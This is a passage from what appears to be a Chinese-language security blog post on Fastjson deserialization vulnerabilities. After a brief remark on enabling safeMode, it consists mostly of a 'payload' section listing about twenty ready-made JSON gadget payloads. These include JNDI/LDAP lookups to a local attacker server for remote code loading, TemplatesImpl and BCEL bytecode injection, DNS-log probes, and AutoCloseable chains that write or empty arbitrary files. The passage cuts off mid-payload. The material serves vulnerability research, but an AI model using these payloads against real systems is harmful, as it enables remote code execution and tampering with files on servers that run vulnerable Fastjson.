class="hljs-selector-class">.getGlobalInstance</span>()<span class="hljs-selector-class">.setSafeMode</span>(true);<br></code></pre></td></tr></table></figure><p>开启之后，就完全禁用AutoType即<code>@type</code>了，这样就能防御住Fastjson反序列化漏洞了。</p><p>具体的处理逻辑，是放在checkAutoType()函数中的前面，获取是否设置了SafeMode，如果是则直接抛出异常终止运行</p><h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><p>JdbcRowSetImpl</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>TemplatesImpl</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;yv66vgA...k=&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>&#x27;_name&#x27;<span class="hljs-punctuation">:</span> &#x27;su18&#x27;<span class="hljs-punctuation">,</span><br>&#x27;_tfactory&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JndiDataSourceFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;data_source&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>SimpleJndiBeanFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;targetBeanName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;propertyPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;su18&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;beanFactory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;shareableResources&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br>      <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>DefaultBeanFactoryPointcutAdvisor</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;beanFactory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="hljs-punctuation">,</span><br>     <span class="hljs-attr">&quot;shareableResources&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>       <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br>     <span class="hljs-punctuation">]</span><br>   <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>   <span class="hljs-attr">&quot;adviceBeanName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>WrapperConnectionPoolDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;userOverridesAsString&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:aced000...6f;&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JndiRefForwardingDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;jndiName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;loginTimeout&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>  <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>InetAddress</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://dnslog.com&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>Inet6Address</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://dnslog.com&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>URL</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://dnslog.com&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JSONObject</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://dnslog.com&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>URLReader</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;poc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONReader&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>AutoCloseable 任意文件写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/path/to/target&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.compress.compressors.gzip.GzipParameters&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;filename&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;filecontent&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>BasicDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driverClassName&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A...&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driverClassLoader&quot;</span> <span class="hljs-punctuation">:</span><br>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Lcom.sun.org.apache.bcel.internal.util.ClassLoader;&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JndiConverter</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;AsText&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JtaTransactionConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JndiObjectFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;resourceName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>AnterosDBCPConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>AnterosDBCPConfig2</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>CacheJndiTmLookup</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>AutoCloseable 清空指定文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/nonexist&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>AutoCloseable 清空指定文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.io.FileWriter&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/nonexist&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>AutoCloseable 任意文件写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/nonexist&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.solr.common.util.FastOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempBuffer&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;sink&quot;</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">38</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.iq80.snappy.SnappyOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>AutoCloseable MarshalOutputStream 任意文件写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>&#x27;@type&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>&#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;sun.rmi.server.MarshalOutputStream&#x27;<span class="hljs-punctuation">,</span><br>&#x27;out&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>&#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;java.util.zip.InflaterOutputStream&#x27;<span class="hljs-punctuation">,</span><br>&#x27;out&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>&#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="hljs-punctuation">,</span><br>&#x27;file&#x27;<span class="hljs-punctuation">:</span> &#x27;dst&#x27;<span class="hljs-punctuation">,</span><br>&#x27;append&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>&#x27;infl&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>&#x27;input&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>&#x27;array&#x27;<span class="hljs-punctuation">:</span> &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<span class="hljs-punctuation">,</span><br>&#x27;limit&#x27;<span 